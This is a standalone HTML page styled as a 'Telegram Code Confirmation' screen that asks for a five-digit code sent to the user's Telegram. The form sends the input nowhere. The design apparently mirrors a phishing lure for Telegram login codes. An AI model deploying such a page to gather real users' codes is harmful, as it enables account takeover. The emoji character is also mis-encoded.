<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f6f6f6;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #eff0f1;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #0088cc;
            font-family: 'Telegram', sans-serif;
            font-size: 28px;
            margin-bottom: 10px;
        }
        p {
            color: #333;
            font-family: 'Telegram', sans-serif;
            font-size: 18px;
            margin-bottom: 20px;
        }
        .code-input {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }
        .code-input input[type="text"] {
            width: 50px;
            height: 50px;
            text-align: center;
            padding: 5px;
            margin-right: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-family: 'Roboto', sans-serif;
            font-size: 24px;
        }
        .emoji {
            font-size: 64px;
            margin-bottom: 20px;
        }
        button {
            padding: 10px 20px;
            margin-top: 10px;
            background-color: #0088cc;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-family: 'Telegram', sans-serif;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <span class="emoji">ðŸ“©</span>
        <h1>Telegram Code Confirmation</h1>
        <p>Please confirm the code sent to your Telegram.</p>
        <form>
            <div class="code-input">
                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
                <input type="tel" pattern="[0-9]{1}" inputmode="numeric">
            </div>
            <button>Confirm</button>
        </form>
    </div>
</body>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</html>
